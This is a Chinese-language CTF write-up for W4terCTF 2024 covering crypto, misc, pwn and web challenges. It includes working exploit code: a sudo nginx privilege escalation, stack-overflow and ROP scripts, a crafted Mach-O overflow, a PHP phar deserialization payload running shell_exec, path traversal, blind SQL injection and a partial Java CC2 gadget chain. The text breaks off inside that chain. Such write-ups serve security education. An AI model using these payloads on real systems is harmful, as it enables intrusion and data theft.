---
title: W4terCTF 2024 SCC旅游队 WP
date: 2024-04-30 23:31:32
tags:

typora-root-url: ..
---

![image-20240501000403233](/images/W4terCTF_2024_SCC旅游队_WP/image-20240501000403233.png)

![image-20240501000343394](/images/W4terCTF_2024_SCC旅游队_WP/image-20240501000343394.png)

# MISC

## Priv Escape

既然是提权，进去之后 `cat /etc/passwd`，发现有一个r00t用户。

`sudo -l`，发现`W4terCTFPlayer`用户可以无密码以`r00t`用户身份运行`/usr/sbin/nginx`.

然后发现flag在 `/tmp/flag`下，且文件读权限属于 `r00t`。

以`r00t`身份配置nginx开启一个web服务，输出flag即可。

但没有权限修改`/etc/nginx/nginx.conf`，所以在所有用户都可以访问的 `/tmp`下创建配置文件，然后 `nginx -c`指定之。

但还是会报错，查阅后修改`pid`文件路径就行。

```
pid /tmp/nginx.pid;  

events {}  

http {
    server {
        listen 2829;  
        location /flag {
            alias /tmp/flag;  
        }
    }
}
```

```bash
sudo -u r00t /usr/sbin/nginx -c /tmp/nginx.conf
curl http://localhost:2829/flag
```

![image-20240429010916220](/images/W4terCTF_2024_SCC旅游队_WP/image-20240429010916220-17144918173981.png)



## broken.mp4

搜索找到工具

![image-20240429011127178](/images/W4terCTF_2024_SCC旅游队_WP/image-20240429011127178-17144918173992.png)



## Revenge of Vigenere

可以猜出的明文有：

1. W4terCTF
2. 单个字母的单词，只有a（虽然u和i也有可能，但还是这么假设了）

总共14个字母。

读代码可知，

1. 密文只与key、字母、位置有关。
2. 加密每个字母位置，只使用到key里的其中一个字母。
3. 如果知道key的长度，就可以知道加密某个位置使用的是哪个key里的字母。

枚举key长度，然后对这14个已知明文，枚举对应位置的key，复杂度14 * 26 * 10，发现可以稳定排除到只剩下一种key长度。

多开几次终端，直到随机到的key长度为10，发现剩下800种可能的key。

生成800个可能的明文，然后用2字母单词表，排除所有不合法的明文，最后只剩下30个明文，且flag都是相同的。

```python
import copy
from recv_mi import recv_mi
possible_key = []
known_chars = {
    609: "W", 
    610: "4",
    611: "t",
    612: "e",
    613: "r",
    614: "C",
    615: "T",
    616: "F",
    16: "a",
    336: "a",
    557: "a",
    598: "a",
    739: "a",
    759: "a"
}


def get_cipher(idx, ming_char, key_char):
    key_offset = ord(key_char) - 65

    if ming_char.isupper():
        base = ord('A')
    else:
        base = ord('a')

    if (idx + 1) % 2 == 1: # 偶数
        encrypted_char = chr(
            (ord(ming_char) - base + idx * key_offset) % 26 + base)
    else: # 奇数
        encrypted_char = chr(
            (ord(ming_char) - base - idx * key_offset) % 26 + base)
    return encrypted_char


def update_key(idx, ming, mi):
    enumerate_str = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    possible_key_chars_for_this_update = []
    for key_char in enumerate_str:
        # print(key)
        # print(get_cipher(idx, ming))
        # print(mi)
        if get_cipher(idx, ming, key_char) == mi:
            # print("idx: ", idx, "ming: ", ming, "mi: ", mi, "key_char: ", key_char)
            possible_key_chars_for_this_update.append(key_char)
            # print("len: ", len(key), "idx: ", idx%len(key), "key_char: ", key_char)
    # print(possible_key_chars_for_this_update)
    # print(idx % key_len)
    tmp_possible_key = copy.deepcopy(possible_key[idx % key_len])
    for k in tmp_possible_key:
        if k not in possible_key_chars_for_this_update:
            possible_key[idx % key_len].remove(k)




# LCDBMYXYFUOZJRCW
# for i, k in known_chars.items():
#     print(i, k, original_text[i])

while True:
    original_text = recv_mi()
    
    keyidx_ming_mi = {
    
    }
    key_idx = 0
    for idx, c in enumerate(original_text):
        if idx in known_chars.keys():
            keyidx_ming_mi[key_idx] = (known_chars[idx], c)
        if c.isalpha():
            key_idx += 1

    # print(keyidx_ming_mi)
    
    
    
    for key_len in range(10, 20):
        possible_key = [["A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z"] for _ in range(key_len)]
        for idx, (ming, mi) in keyidx_ming_mi.items():
            update_key(idx, ming, mi)
        if [] in possible_key:
            continue
        if key_len != 10:
            continue
        print("key_len: ", key_len)
        print(original_text)
        for k in possible_key:
            print(k)
```

```python
import socket

# 设置目标主机和端口
def recv_mi():
    host = '127.0.0.1'
    port = 7384

    # 创建socket对象
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # 连接到服务器
    client_socket.connect((host, port))

    text = client_socket.recv(1090)
    text = text.decode()[:-1]
    # print(text)

    # 关闭连接
    client_socket.close()
    return text
```

```python
import itertools
"""
Vhwdb! Tx cyjs, b nuaidv fzmmcdgoljeg jvjuzzv, nyfd uqasmyjmzrf ay dfrm hjeiaa maj kogjxsj xh hge kchkwynpdxni bz Rqui. Mvle Qumadq, qw jmui Xogyrt fj Gwxcia, fo tt Oskxtql ek pik Vce hfztdr, lwu Yadegh, Mqdqrppb, nc spc gisz Npzhl Bqzaj ag vww Jqeohohgispqms mol Pjpixfpnm fxnn fxfc hbfq Quficuhl. Ewzixok, nukj Zlhyldwp Rtsbhsxtyu ek w ce-gcuw Mowscgwl, vtbrwg Mylqeqpb, nxc pyk Qerwk zv Vgphsnei vwwgq Ikcgg ykn Reaikecn Agvsnj euwwhudt-jrz Jloz mhd Saxkeadjkxz nug Mmzhohinv Rtcbcmw lxk Ltnbiicbk Msndjrqmq og Zhzzjywm. Ixgqcs bfan Ljjake ol Xvpgatkiq, o Hroaky Tbcpeps nf Kcsfmifpriw uzydwfw: t Jdddmvlb I4wmoKWJ{63p34Da_7bR_o4jo_GEQYc3Tb_oeReY3k_F4NU_Dy7M_rFt634nQL}, qvd Uaeykgrut Zxqkeh nnz Ggpdnzw. Lcu jfse Cexfzay ut Xtfuqntrk; v Tbxzachz, htfi cw g Akcceu, aif yo Ztwq, rjd nhb Hdtrm drf Fxlnezxj kp mjee osaez grp nho Aeojiqhlv dgw Egogoaox tbu jxm Uqcrhytap mjee osaez grp nho Aeojiqhlv dgw Egogoaox tbu jxm Uqcrhyta. Twmygq, anps Bktfdetqxks as Btxwgxqa Rnsqs bixv Zkwxxmn, orn iyulbb lfn Hilryha iqhw vrx Pvdieyp Fixeb kq Vtzahldpes. Eo zhwz Nvsm, ac ga kb Vfvr ufet pnvzp gy lmcl tep suj foa orw hmmn bw J.
['K', 'X']
['H']
['H', 'U']
['U']
['B', 'O']
['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
['G', 'T']
['Z']
['C', 'P']
['L']
"""

possible_keys = {
    0: ['B', 'O'],
    1: ['J'],
    2: ['L', 'Y'],
    3: ['J'],
    4: ['A', 'N'],
    5: ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'],
    6: ['B', 'O'],
    7: ['I'],
    8: ['H', 'U'],
    9: ['X'],
}

# 根据字典的键（即位置）对列表进行排序
sorted_keys = sorted(possible_keys.keys())

# 获取每个位置的字符列表
choices = [possible_keys[k] for k in sorted_keys]

# 生成所有可能的key组合
all_keys = itertools.product(*choices)


plaintext = "Vfekx! Kt rmfg, f jhmhby rfowmwivlaow zlhtrox, sgfh qcfajccsjjh aj bkxt ldkqor anr fqkdlug bc rpe ykbazsqbavle bd Aafw. Xrto Wmbawg, pq bkgo Sehqel hv Yqyiru, ge ft Martkma sg dmg Iod filzfb, vpw Fauowx, Cocigruj, ng obh ofws Tzrjl Moegq ea bek Aerwcqlawumuhc voz Xdflribkk dtnr ohqq sxna Wmuivkgf. Wulosel, fhcl Ldbzrmqq Hfszpztkuj sg k ga-totu Pacumqpn, ctsbmw Cwkitsuj, nby bds Nikcu rx Vrnmyuic bekxe Vsxik syp Oivsteqv Uwymqv bsushymd-ufk Ftyf ewd Lqwewyppfna fhy Oyrbpnrhw Hfczkts ctz Zpbfevoai Petftbjox ox Jxpphxob. Kcoqgo nkik Pcpkcg ow Vavnenqqe, f Vewvmc Npemikc wf Ykmvpcibogu qzcmgqk: e Flnjeklu Y4vggIIP{63k34Tb_7tE_g4la_YYREl3Nc_eqRcG3r_B4EQ_Sm7I_fJp634aCK}, oyp Acoidiyuk Jngacg fcb Lophjlb. Tzy clcw Eeidegf yn Dbtleabmm; z Npzwexri, hhnc sz a Dwzacq, amo iz Nesy, bpv chu Xcnjk pxa Vydawbjb eq ssyf eeach nng jwc Wssfvcgjy pmy Oqhivafh jrk hwe Jshzhcpm. Yejczw, kfrs Miylkinwfyj of Jozaalsx Viczs pqrl Cezjukl, krr rifzmx tpt Zxlkogu aotc qhy Hivkqqj Gogyc ac Vrhhdczeso. Ss vuiy Lyes, cm qt mi Vwfh kvcs hcxex gc hyht qii yeb hol mwc oqgt jk A."
# get all possible keys


def decrypt_vigenere_variant(ciphertext, key):
    key_index = 0
    key_length = len(key)
    plaintext = ''
    text_index = 0

    for idx, char in enumerate(ciphertext):
        
        if char.isalpha():
            key_char = key[key_index % key_length].upper()
            key_offset = ord(key_char) - 65

            if char.isupper():
                base = ord('A')
            else:
                base = ord('a')

            if (text_index + 1) % 2 == 1: # 偶数
                decrypted_char = chr(
                    (ord(char) - base - text_index * key_offset) % 26 + base)
            else: # 奇数
                decrypted_char = chr(
                    (ord(char) - base + text_index * key_offset) % 26 + base)

            plaintext += decrypted_char
            key_index += 1
            text_index += 1
        else:
            plaintext += char

    return plaintext

possible_2_words = [
    "am",
    "an",
    "as",
    "at",
    "ax",
    "by",
    "do",
    "er",
    "go",
    "gs",
    "ha",
    "he",
    "hi",
    "ho",
    "if",
    "in",
    "is",
    "it",
    "ma",
    "me",
    "my",
    "no",
    "of",
    "on",
    "or",
    "so",
    "to",
    "uh",
    "um",
    "up",
    "us",
    "we",
]

def check_two_letter_words(s):
    s = s.lower()  # 转换成小写
    words = s.split(" ")  # 按空格分割成单词
    # for word in words:
        # if len(word) == 2 and word[0].isalpha() and word[1].isalpha():
            # print(word)
    for word in words:
        if len(word) == 2 and word[0].isalpha() and word[1].isalpha() and word not in possible_2_words:
            return False  # 如果是2字母单词且不在列表中，返回False
    
    return True  # 所有2字母单词都在列表中

# 打印所有可能的key
f = open("keys.txt", "a")
for key_tuple in all_keys:
    key = ''.join(key_tuple)
    # print(decrypt_vigenere_variant(plaintext, key))
    ming = decrypt_vigenere_variant(plaintext, key)
    if not check_two_letter_words(ming):
        continue
    f.write(ming + "\n")
    # print(key)
```

![image-20240429012416643](/images/W4terCTF_2024_SCC旅游队_WP/image-20240429012416643-17144918173993.png)



## Spam 2024

![image-20240429012549558](/images/W4terCTF_2024_SCC旅游队_WP/image-20240429012549558-17144918173994.png)

用这玩意解码，得到emoji，然后用emoji aes解码，用🔑作为密码可以解（我们3个人想了3天）。

得到

![image-20240429012707068](/images/W4terCTF_2024_SCC旅游队_WP/image-20240429012707068-17144918173995.png)

然后就卡了两天。。发现这个网站有问题，换一个就可以

![image-20240429012852126](/images/W4terCTF_2024_SCC旅游队_WP/image-20240429012852126-17144918173996.png)

后面看起来就是base64（异或个数？），ciberchef工具可解。

![image-20240429012948673](/images/W4terCTF_2024_SCC旅游队_WP/image-20240429012948673-17144918173997.png)



## Sign In

![image-20240429013159615](/images/W4terCTF_2024_SCC旅游队_WP/image-20240429013159615-17144918173998.png)

队友做的，我也不知道怎么想到的。。太抽象。



# CRYPTO

## Wish

生成一个接近114514的随机数就行。发现seed和随机次数都是我们可控的，且范围限制了，枚举可以生成接近114514的组合就行。

```python
from flask import Flask, request, jsonify, send_from_directory
import random
import string
import os
import time
import requests
from functools import wraps
from hashlib import sha256
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
def generate_wish(time, index):
    # 初始化随机种子，保证随机过程的可重现性
    random.seed(time)
    
    # 初始化概率变量
    probability = 0
    
    # 通过循环，根据 index 的次数来增加获取特殊输出的难度
    for _ in range(index):
        # 生成一个随机数，计算与 114514 的差的绝对值，并限制最大不超过 10000
        rand_int = random.randint(0, 1919810)
        diff = min(abs(rand_int - 114514), 10000)
        # print(rand_int)
        # 计算概率，基于差值 diff，越大的 diff 导致概率越小
        probability = 100 * (0.1) ** diff

    # 记录概率、时间和索引到日志
    print(probability)
    # print(diff, probability)
    # 生成一个 0 到 255 的随机数，转换成 1 到 100 的范围内的一个数，如果这个数小于等于计算的概率，则返回特殊字符串 "flag"
    if int.from_bytes(os.urandom(1), 'little') % 100 + 1 <= probability:
        return "flag"
    else:
        # 否则生成一个由 4 个随机字母或数字组成的字符串返回
        characters = string.ascii_letters + string.digits
        return ''.join(random.choice(characters) for _ in range(4))

# generate_wish(1, 1)
# time < 24*60*60 or not 0 <= index < 10
for time in range(24*60*60):
    random.seed(time)
    for index in range(10):
        result = random.randint(0, 1919810)
        diff = min(abs(result - 114514), 10000)
        if diff <= 10:
            print(f"print(generate_wish({time},{index+1}))")
# print(generate_wish(6856,7))
# print(generate_wish(7758,1))
print(generate_wish(10693,2))
# print(generate_wish(20499,3))
# print(generate_wish(20544,1))
# print(generate_wish(39259,10))
```

```python
import requests
import json

d = {
    'time': 10693,
    "index": 2
}

url = 'http://127.0.0.1:22452/wish'
headers = {'Content-Type': 'application/json'}

response = requests.post(url, data=json.dumps(d), headers=headers)
print(response.text)
```

 

## Smoke hints

```
assert 114514 * x**2 - 11680542514 * y**2 + 1919810== 2034324
```

这个方程化简后，搜索可知叫什么pell方程，有在线工具可解。

```
x = 34834945635419823491817566563399234823053176449889821571800075702352062905044231520196782430564993617886316750841220280683153456634693274516582390418863033711415731372881163288179660369032440262647344962570809308551786423557604581792293023628226671539671001863522824415876161727357840363896909435994314597682318687286109212360132261705780761350223208855493439905713509683216585447535669179103840355151676900348955850726834778558748576176596609474037298456423607570516459873639794526160082489103786303332253388597560031538949333472681857144605196440020688999368156212067614295618998719682195870452330682061061500341728481458877113934526003865064359452801
y = 109071911012732502022850422978096246932142152916423367258339958080776017127779842287569032054094868715662547617710798972237860865468979518796870762466053422806566269221859683504667443154145089120448705028998733329483536176859312788275313407342047772524898407149610870586148015013605624329594138230714119704939505401061380777712216157719510271261619101362035144616187262082302740411574934586360516695062056563100258177611076242927354475633328163841594305884855770651187471060662561145818768319723133613889115397679168254599526858767478331211008997427364431641348477558436549415894985022330773540762573918592860707967250624976183104841257499345937186160

```

hint1和hint2，用那个什么费马小定理还是大定理忘了，反正跟取模和阶乘有关的，可以算出 `e % hint1`.

hint5 和 `pq == n` 联立，得到一个一元二次方程，求根公式可解p、q。

接下来只要知道e就能求出d，进而解flag了。由于我们知道`e % hint1`，所以枚举e实际上复杂度可以是18位（`<1000*1000 = 1e6`），一秒内可解。

```python
import math
import gmpy2
from Crypto.Util.number import *
x = 34834945635419823491817566563399234823053176449889821571800075702352062905044231520196782430564993617886316750841220280683153456634693274516582390418863033711415731372881163288179660369032440262647344962570809308551786423557604581792293023628226671539671001863522824415876161727357840363896909435994314597682318687286109212360132261705780761350223208855493439905713509683216585447535669179103840355151676900348955850726834778558748576176596609474037298456423607570516459873639794526160082489103786303332253388597560031538949333472681857144605196440020688999368156212067614295618998719682195870452330682061061500341728481458877113934526003865064359452801
y = 109071911012732502022850422978096246932142152916423367258339958080776017127779842287569032054094868715662547617710798972237860865468979518796870762466053422806566269221859683504667443154145089120448705028998733329483536176859312788275313407342047772524898407149610870586148015013605624329594138230714119704939505401061380777712216157719510271261619101362035144616187262082302740411574934586360516695062056563100258177611076242927354475633328163841594305884855770651187471060662561145818768319723133613889115397679168254599526858767478331211008997427364431641348477558436549415894985022330773540762573918592860707967250624976183104841257499345937186160

hint1 = 192781
hint2 = 47774
hint3 = 60576026590600259670672243316454570492624421230495631931000192409055848130741
hint5 = 8511730724111964551729648090729496334258464192329184421659576645926599745477161822445517490596590696950062427572575526924799059888666410239715127036312296366585830018076537347299421339111672517129148105960509261742310220843833374372904139318281616182166021002261393795535112869462311735463612914585297620293860621701131730277272821219143346985931152728279881790681954689974630908896825969333295695181241012489163786002809370145999592284058415342624797732712760072004860896067132358824909102653364690616242393827145341121840674550817426334207507567449956346518986079624104826544648712669594694134475571390529392633895275955083760115922736760927570675404631940671685828526586261195391960557757913458216448618470990375767090556916208792258717438205340813796801946489277758918165576604617952172191540118302733000628996216777652720945519881524177697431041702690664952498309153120263637823680339061905877149684678692781468455730331627980831220437389079280991254950593882967823026590446730142319499024841640947362389225152331236371922180283445573626135466824904210917427490636952921378536060829448543919981926196787241206363691684778533952719656388635961478329468952170590125859803622041556575744556804393520979820756127437839552060509856362789792315284194733993550237705397625576897440110685737966482458608194920884839647283339411758570498538441141847136789169862716291709407749350408470871463686429971092560523367157003727404402594830155973396360156525460786550459
n = 91620074399539809984032723545351878857231404164319864623221094688657125377027285009645571441155504054187379051470977726713242390019129283863392373101381688054973449768838194493179543768483189475792087995471028352084286722134848914536334687912058816254874133885652962545004058120887042512517692965510462397241
a = x*x
b = -hint5
c = y*y*n
delta = b**2 - 4*a*c
p = (-b + gmpy2.isqrt(delta)) // (2*a)
q = n // p
assert p*q == n
print("p: ", p)
print("q: ", q)
print("p >> 256: ", q >> 256)
phi_n = (p - 1) * (q - 1)

print("-e %% hint1 = ", hint2 * (hint1 - 1) % hint1)
print("e %% hint1 = ", (-hint2 * (hint1 - 1) % hint1))
e = 47774
while True:
    if gmpy2.gcd(e, phi_n) == 1:
        d = gmpy2.invert(e, phi_n)
        # print("d: ", d)
        c = 65435825387874654621973820173684357930891084341923245373206680337928082683585920767121649511918887839345637501253199242846753956015664987538955869880399173018904575399077778001978623718389355282941668670432673851419492234811356745252380429764970466586970656409752589485922863804052082625865837025313364851854
        m = pow(c, d, n)
        m = long_to_bytes(m)
        if all(32 <= i < 127 for i in m):
            print(m)
            break
    e += hint1

```

# PWN

## Remember It 0

```python
from pwn import *
from pwn import remote
# 设置目标，如果是本地文件就使用 process，如果是远程服务就使用 remote
context.log_level = 'debug'
# target = remote("127.0.0.1", 32849)
# target = remote('ip_address', port)  # 使用 remote('ip_address', port) 来替换


def get_string():
    # 等待直到出现 "String" 字样
    target.recvuntil("[*] String ".encode())
    
    # 读取字符串编号
    recved_line = target.recvline()
    info("recved_line " + str(recved_line))
    # remove \x08 and space and \n in bytes:
    recved_line = recved_line.replace(b'\x08', b'').replace(b' ', b'').replace(b'\n', b'')
    recved_line = str(recved_line)
    recved_line = recved_line.split(":")[1][:-1]
    info("recved_line " + str(recved_line))
    return recved_line

def send_string(string):
    # 发送字符串加上换行符
    target.sendline(string.encode())

def main():
    t = 0
    while True:
        t += 1
        if t == 12:
            break
        send_string("1")
        received_string = get_string()
        send_string(received_string)
    target.interactive()   

if __name__ == "__main__":
    main()
```



## Remember It 1

发现次数是可以>10的，那么就可以栈溢出，溢出到后门函数就行了。

```python
from pwn import *
from pwn import remote
context.log_level = 'debug'
target = remote("127.0.0.1", 32849)
# target = process("./always_correct")


def get_string():
    # 等待直到出现 "String" 字样
    target.recvuntil("[*] String ".encode())
    
    # 读取字符串编号
    recved_line = target.recvline()
    info("recved_line " + str(recved_line))
    # remove \x08 and space and \n in bytes:
    recved_line = recved_line.replace(b'\x08', b'').replace(b' ', b'').replace(b'\n', b'')
    recved_line = str(recved_line)
    recved_line = recved_line.split(":")[1][:-1]
    info("recved_line " + str(recved_line))
    return recved_line
def send_string(string):
    # 发送字符串加上换行符
    target.sendline(string.encode())

def main():
    t = 0
    while True:
        t += 1
        if t == 12:
            break
        send_string("1")
        received_string = get_string()
        send_string("1")
    send_string("1")
    received_string = get_string()
    target.sendline(b"01234567"+p64(0x00000000004018B6))
    target.interactive()
if __name__ == "__main__":
    main()

```

## Remember It 2

开了canary那么先泄露出来，用那个打印history的操作可以泄露。但canary第一位固定是\x00，所以得覆盖成别的，才能让字符串不被截断。

然后这题没有后门，只能进libc用`system("/bin/sh")`了，所以需要泄露一个libc的地址。想了很多方法都很麻烦，最后想到main的返回地址应该是回到libc的，实验发现确实可以通过main的返回地址推出libc的基地址。

题目给了libc版本，直接可以得到system和 `"/bin/sh"`的偏移。然后还需要修改rdi作为system的参数，发现ROPgadget是可以搜到libc里的 `pop rdi; ret`的，这样就做完了。

```python
from pwn import *
from pwn import remote
context.log_level = 'debug'
# target = remote("127.0.0.1", 32849)
# target = remote('ip_address', port)  


def get_string():
    # 等待直到出现 "String" 字样
    target.recvuntil("[*] String ".encode())
    
    # 读取字符串编号
    recved_line = target.recvline()
    info("recved_line " + str(recved_line))
    # remove \x08 and space and \n in bytes:
    recved_line = recved_line.replace(b'\x08', b'').replace(b' ', b'').replace(b'\n', b'')
    recved_line = str(recved_line)
    recved_line = recved_line.split(":")[1][:-1]
    info("recved_line " + str(recved_line))
    return recved_line

def send_string(string):
    # 发送字符串加上换行符
    target.sendline(string.encode())

def main():
    t = 0
    while True:
        t += 1
        if t == 12:
            break
        send_string("1")
        received_string = get_string()
        send_string(received_string)
    target.interactive()   

if __name__ == "__main__":
    main()

```

## MachO Parser

参考w4terctf2023的wp，是可以直接自己构造二进制来生成文件的。

一开始以为栈上没数组，就觉得是堆漏洞，后来一查才发现 `alloca`是在函数栈帧上分配内存的（怎么会有这么奇怪的函数）。

那么溢出点就只有 `loaded_macho`了。它是通过 `seg->filesize`来控制偏移量的。这里就有一个显然的漏洞，alloca分配的是文件大小，而`seg->filesize`是我们可控制的量，构造 `seg->filesize`就可以利用这个栈溢出。

然而，随便修改`seg->filesize`也不可行，因为 `memcpy(loaded_macho, data + seg->fileoff, seg->filesize)`会超过data导致段错误（data是mmap分配的）。我的做法是构造多个seg，它们的`seg->fileoff`是一样的，这样可以让loaded_macho偏移到我们控制的位置，也可以让`memcpy`不访问data外的内容，以及方便控制好文件大小filesize。

溢出后很容易覆盖返回地址为后门函数 `command`。但是还需要一个字符串，以及一个rdi来传入 `cat /flag`的指针。字符串我们可以写入data，且地址可知（因为mmap指定了）。使用ROPGadget没有搜到 `pop rdi; ret`。于是想到libc，但发现即使没开PIE，libc的地址也是会变的，而本题是一次性交互，没办法泄露地址再来搞事情。

既然没法控制rdi那么就回到command看看，发现最后call system的rdi是从rax拿的，而rax又是从rbp偏移的栈上拿的，那么可以控制好rbp，使得rbp+command处是我们在data上提前写入的cat flag的地址，然后直接跳转到call system的前两行。

rbp可以通过覆盖栈上的saved_rbp来控制，这样就可以一次性get shell。（感觉十分优雅

![image-20240429022005521](/images/W4terCTF_2024_SCC旅游队_WP/image-20240429022005521-17144918173999.png)

```python
import struct
from pwn import p64
# 生成Mach-O文件头部
def mach_header_64():
    return struct.pack(
        "<IIIIIIII", # ">IIIIIIII"表示8个无符号整数
        0xfeedfacf,   # MH_MAGIC_64, 64位的魔数
        7,            # CPU_TYPE_X86_64, x86-64架构
        3,            # CPU_SUBTYPE_LIB64 | CPU_SUBTYPE_X86_ALL
        2,            # MH_EXECUTE, 可执行文件
        5,        # 加载命令的数量
        1,   # 所有加载命令的总大小
        0,            # 标志位
        0             # reserved, 保留字段，目前未使用
    )



def segment_command_64_1():
    return struct.pack(
        "<II16sQQQQIIII", # ">IIIIIIIIIIIIII"表示14个无符号整数
        0x19, 
        0x48, #cmdsize
        b"1",
        1, 
        1,
        0x200, 
        0x100, # filesize + 0x100
        1, 
        1, 
        1, 
        1
    )


def segment_command_64_5():
    return struct.pack(
        "<II16sQQQQIIII", # ">IIIIIIIIIIIIII"表示14个无符号整数
        0x19, 
        0x48,
        b"1",
        1, 
        1,
        0x200, 
        0x180, 
        1, 
        1, 
        1, 
        1
    )




def print_hex(filename):
    with open(filename, 'rb') as file:
        byte = file.read(16)  # 读取前16个字节
        while byte:
            # 将每个字节转换为十六进制，并用空格分隔
            hex_values = ' '.join(f'{b:02x}' for b in byte)
            # 每8个字节添加额外的两个空格
            formatted_hex = hex_values[:23] + '  ' + hex_values[23:]
            print(formatted_hex)
            byte = file.read(16)  # 继续读取下一个16字节
        
ret_addr = 0x00000000004017D4
command_addr = 0x00000000004014A0
# pop_rdi_ret_offset = 0x000000000002a3e5
bss_addr = 0x0000000000404070
cat_flag_str_addr = 0x10000000 + 0x380
ptr_cat_flag_str_addr = 0x10000000 + 0x360
mov_eax_str_pop_rbp_ret = 0x000000000040134D
pop_rdi_pop_rbp_ret = 0x000000000040132b
# libc_base_addr = 0x0
# pop_rdi_ret_addr = libc_base_addr + pop_rdi_ret_offset
def create_mach_o_file(filename):
    with open(filename, 'wb') as f:
        f.write(mach_header_64())
        f.write(segment_command_64_1())
        f.write(segment_command_64_1())
        f.write(segment_command_64_1())
        f.write(segment_command_64_1())
        f.write(segment_command_64_5())
        # 补到0x200字节
        f.write(b'\x02' * (0x200 - f.tell()))
        
        # 0x200
        # f.write(p64(0x0000000000404070) * 0x20)
        f.write(p64(0x0000000000404060) * 0x20)
        # 写入0x170个数据
        # 0x300
        f.write(p64(ptr_cat_flag_str_addr + 8)) # saved rbp
        # f.write(p64(ret_addr))
        f.write(p64(command_addr))
        
        # 补到0x360
        f.write(b'\x02' * (0x360 - f.tell()))
        #0x360
        f.write(p64(cat_flag_str_addr))
        
        # 补到0x380
        f.write(b'\x02' * (0x380 - f.tell()))
        # 0x380
        f.write(b"cat /flag\x00")
        
        # 补到0x400
        f.write(b'\x02' * (0x400 - f.tell()))

create_mach_o_file('simple_macho')
print('simple_macho has been created!')
print_hex("simple_macho")
```

# WEB

## Auto Unserialize

搜到传入phar时，file_exists有反序列化漏洞。

GIF89a文件头可以绕过图片检测。

```php
<?php 
    class command_test{
        public $command = "echo 'test'";
        public function __destruct(){
            eval($this->command);
        }
    }
    $a = new command_test();
    $a->command="echo(shell_exec('cat /flag'));";
    $tttang=new phar('p.phar',0);//后缀名必须为phar
    $tttang->startBuffering();//开始缓冲 Phar 写操作
    $tttang->setStub("GIF89a<?php __HALT_COMPILER();?>");//设置stub，stub是一个简单的php文件。PHP通过stub识别一个文件为PHAR文件，可以利用这点绕过文件上传检测
    $tttang->setMetadata($a);//自定义的meta-data存入manifest
    $tttang->addFromString("test.txt","test");//添加要压缩的文件
    $tttang->stopBuffering();//停止缓冲对 Phar 归档的写入请求，并将更改保存到磁盘
?>
```

URL传入：`phar://p.phar/test.txt`

![image-20240429121731522](/images/W4terCTF_2024_SCC旅游队_WP/image-20240429121731522-171449181739910.png)

## GitZip

![image-20240429121555900](/images/W4terCTF_2024_SCC旅游队_WP/image-20240429121555900-171449181739911.png)

这个地方传入 `../../../../../../../../../../../../`之类的东西就可以访问到根目录，但是测试发现只有严格符合它的规则（3个斜杠）才会被捕获。

然后搜到`%2f`似乎可以绕过这种。

![image-20240429121828657](/images/W4terCTF_2024_SCC旅游队_WP/image-20240429121828657-171449181739912.png)

## PNG Server

加个png或者gif文件头就可以绕过图片检测。

但是图片会被重命名，搜到nginx漏洞，在路径后加入 `/.php`就会解析成php。

![image-20240429122323228](/images/W4terCTF_2024_SCC旅游队_WP/image-20240429122323228-171449181739913.png)

## User Manager

传入两个元素，然后给order_by加上条件，就可以盲注。条件为真增序，假则反序。

```python
import requests
import json
import string

characters = list(string.ascii_uppercase + string.ascii_lowercase + string.digits + '_}')

url_base = "http://127.0.0.1:52199/users?order_by="

current_string = "W4terCTF{DI5c0V3R_7He_h1ddEn_fLa6_BY_8L1Nd_InjEcTln9_INto_tHe_USer_MAN"

max_length = 90  
for position in range(71, max_length + 1):
    found = False
    for char in characters:
        order_by = f"CASE WHEN (SELECT substr(Secret, {position}, 1) FROM users WHERE id = 1) = '{char}' THEN id ELSE -id END"
        url = f"{url_base}{order_by}"

        # 发送GET请求
        response = requests.get(url)
        if response.status_code != 200:
            print(f"Failed to retrieve users for character: {char} at position {position}")
            continue

        # 尝试解析响应的JSON内容
        try:
            users = json.loads(response.text)
            if users is None or not users:
                print(f"No users found for character: {char} at position {position}")
                continue

            # 检查第一个用户的ID是否为1
            if users[0]['ID'] == 1:
                current_string += char  # 将匹配的字符加入到当前字符串中
                print(f"Current matching string: '{current_string}'")
                found = True
                break
        except json.JSONDecodeError:
            print(f"Failed to decode JSON response for character: {char} at position {position}")
        except (IndexError, KeyError):
            print(f"Unexpected response format for character: {char} at position {position}")
    
    if not found:
        print("No more characters found, stopping search.")
        break  # 停止进一步搜索，因为我们已经找不到更多的字符
```

但是当时没写二分让它慢慢跑导致痛失前3血（flag怎么这么长）

## ASHBP

得让cre解密出来是flag。发现可以下载公钥（PUBLIC），直接用下载下来的公钥加密flag和 `/tmp/flag ` 

![image-20240429124846983](/images/W4terCTF_2024_SCC旅游队_WP/image-20240429124846983-171449181739914.png)

（一开始没看docker file，导致找半天不知道flag在哪。但是做完这个去做priv escape就很快找到 `/tmp/flag`

## Just ReadObject

搜索transform，反序列化，read object等关键词可以找到 “CC2链”。具体地，priority_queue在readobject的时候，会调用其元素的Comparator的compare函数。

模仿CC2链，构造一个priority_queue，指定Comparator，并在Comparator里套娃另一个comparator，就可以实现一个链式的调用。

```java
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.lang.reflect.Method;
import java.util.Comparator;
import java.util.PriorityQueue;



// 主类
public class Serialize {
    public static void main(String[] args) {
        // 创建字符串转换器
        
        W4terInvokerTransformer<Object, Object> transformer3 = new W4terInvokerTransformer<>(
            "getMethod",                                         // 方法名，使用Runtime.exec来执行命令
            new Class<?>[] {String.class, Class[].class},                  // 参数类型，exec方法接受一个字符串参数
            new Object[] {"getRuntime", new Class[0]}                           // 参数值，Windows中打开计算器的命令
        );
        W4terInvokerTransformer<Object, Object> transformer2 = new W4terInvokerTransformer<>(
            "invoke",                                         // 方法名，使用Runtime.exec来执行命令
            new Class[] {Object.class, Object[].class },                  // 参数类型，exec方法接受一个字符串参数
            new Object[] {null, new Object[0] }                           // 参数值，Windows中打开计算器的命令
        );
